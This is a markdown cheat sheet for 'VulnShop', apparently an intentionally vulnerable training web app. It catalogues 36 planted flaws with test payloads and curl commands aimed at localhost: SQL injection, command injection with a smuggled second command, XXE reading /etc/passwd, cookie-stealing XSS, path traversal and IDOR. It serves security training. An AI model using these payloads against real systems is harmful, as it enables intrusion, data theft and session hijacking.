# 🎯 VulnShop - Quick Vulnerability Reference

## 🔐 Authentication Vulnerabilities

| # | Vulnerability | Endpoint | Quick Test |
|---|--------------|----------|------------|
| 1 | SQL Injection Login | `POST /api/auth/login` | username: `admin' OR '1'='1' --` |
| 2 | Session Not Invalidated | `POST /api/auth/logout` | Cookie persists after logout |
| 3 | Weak Session Token | Cookie: authToken | SHA1(password) - crackable |
| 4 | Username Overwrite | `POST /api/auth/register` | Register with existing username |
| 5 | Password Brute Force | `POST /api/auth/change-password` | No rate limit |
| 6 | OTP Brute Force | `POST /api/auth/verify-otp` | Try 0000-9999 |
| 7 | OTP Response Manipulation | `POST /api/auth/verify-otp` | Change `valid:false` to `valid:true` |
| 8 | Cross-User OTP | `POST /api/auth/verify-otp` | Use OTP from different user |
| 9 | User Enumeration | `POST /api/auth/forgot-password` | Different timing for valid/invalid users |
| 10 | Reset Token Reuse | `POST /api/auth/reset-password` | Token works for any user |

## 🪪 IDOR Vulnerabilities

| # | Vulnerability | Endpoint | Quick Test |
|---|--------------|----------|------------|
| 11 | Profile Access | `GET /api/users/{userId}` | Change userId to 1,2,3... |
| 12 | Wallet Manipulation | `GET /api/users/{userId}/wallet` | Access other users' balances |
| 13 | Cart Manipulation | `POST /api/cart/{userId}/add` | Add items to other users' carts |
| 14 | Order Access | `GET /api/orders/{userId}` | View other users' orders |
| 15 | Address Update | `POST /api/users/{userId}/address` | Update other users' addresses |

## 💉 Injection Vulnerabilities

| # | Vulnerability | Endpoint | Quick Test |
|---|--------------|----------|------------|
| 16 | SQL Injection Search | `GET /api/products?search=` | `search=' OR '1'='1' --` |
| 17 | Command Injection | `POST /api/admin/logs` | `command: cat access.log; whoami` |
| 18 | XXE | `POST /api/products/check-stock` | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| 19 | Stored XSS | `POST /api/feedback` | `<script>alert('XSS')</script>` |

## 📂 Path Traversal & Information Disclosure

| # | Vulnerability | Location | Quick Test |
|---|--------------|----------|------------|
| 20 | Path Traversal | `GET /api/products/image?file=` | `file=../../../../etc/passwd` |
| 21 | Directory Listing | `/uploads/profile/` | Browse directory in browser |
| 22 | .git Exposure | `/.git/` | Access git directory |
| 23 | robots.txt Leak | `/robots.txt` | View hidden directories |
| 24 | Dependencies Exposure | `/dependencies/` | View package files |
| 25 | File Browser | `GET /api/files?path=` | `path=../../` |
| 26 | Unauthenticated Stats | `GET /api/admin/server-stats` | No auth required |

## 📤 File Upload Vulnerabilities

| # | Vulnerability | Endpoint | Quick Test |
|---|--------------|----------|------------|
| 27 | Content-Type Bypass | `POST /api/users/{id}/profile-photo` | Spoof MIME type |
| 28 | File Upload in Feedback | `POST /api/feedback` | Upload malicious files |

## 🌐 SSRF & XXE

| # | Vulnerability | Endpoint | Quick Test |
|---|--------------|----------|------------|
| 29 | Internal Metrics | `GET /metrics` | Only accessible via SSRF |
| 30 | XXE to SSRF | `POST /api/products/check-stock` | `<!ENTITY xxe SYSTEM "http://localhost:3001/metrics">` |

## 🔧 HTTP Methods

| # | Vulnerability | Test | Description |
|---|--------------|------|-------------|
| 31 | TRACE Enabled | `TRACE /api/admin/server-stats` | Reveals X-Internal-Auth-Key |

## 💼 Business Logic Flaws

| # | Vulnerability | Endpoint | Quick Test |
|---|--------------|----------|------------|
| 32 | Credit Manipulation | `POST /api/users/{id}/credit-request` | Auto-approves credit |
| 33 | Stock Bypass | `POST /api/orders/{id}/checkout` | Buy out-of-stock items |
| 34 | Insufficient Funds | `POST /api/orders/{id}/checkout` | Checkout without enough credit |
| 35 | Sequential IDs | All resources | IDs are 1,2,3,4... |

## 🛡️ CSRF

| # | Vulnerability | Endpoint | Quick Test |
|---|--------------|----------|------------|
| 36 | Address CSRF | `POST /api/users/{id}/address?data=` | No CSRF token |

---

## 🧪 Quick Testing Commands

### SQL Injection Login
```bash
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1'\'' --","password":"x"}'
```

### IDOR - Access User 2's Profile
```bash
curl http://localhost:3001/api/users/2
```

### XXE - Read /etc/passwd
```bash
curl -X POST http://localhost:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId></stockCheck>'
```

### Path Traversal
```
http://localhost:3001/api/products/image?file=../../../../etc/passwd
```

### Command Injection
```bash
curl -X POST http://localhost:3001/api/admin/logs \
  -H "Content-Type: application/json" \
  -d '{"command":"cat access.log; id"}'
```

### XSS in Feedback
```bash
curl -X POST http://localhost:3001/api/feedback \
  -F "userId=1" \
  -F "message=<script>alert(document.cookie)</script>"
```

---

## 📊 Vulnerability Difficulty Levels

### 🟢 Beginner (Easy)
- SQL Injection in Login
- IDOR on User Profile
- Directory Listing
- Sequential IDs
- Session Persistence

### 🟡 Intermediate (Medium)
- XXE Exploitation
- Command Injection
- Stored XSS
- Path Traversal
- File Upload Bypass
- OTP Brute Force

### 🔴 Advanced (Hard)
- XXE to SSRF Chain
- Reset Token Reuse Across Users
- OTP Response Manipulation
- Business Logic Flaws
- TRACE Method Exploitation

---

## 🎓 Learning Path

1. **Day 1**: IDOR and SQL Injection
2. **Day 2**: XSS and Path Traversal
3. **Day 3**: Command Injection and File Upload
4. **Day 4**: XXE and SSRF
5. **Day 5**: Business Logic and Advanced Chains

---

## 🔗 Useful URLs

- Frontend: http://localhost:3000
- Backend API: http://localhost:3001/api
- Health Check: http://localhost:3001/health
- robots.txt: http://localhost:3001/robots.txt
- .git Directory: http://localhost:3001/.git/
- Uploads: http://localhost:3001/uploads/
- Internal Metrics: http://localhost:3001/metrics (SSRF target)

---

**Happy (Ethical) Hacking! 🎯**
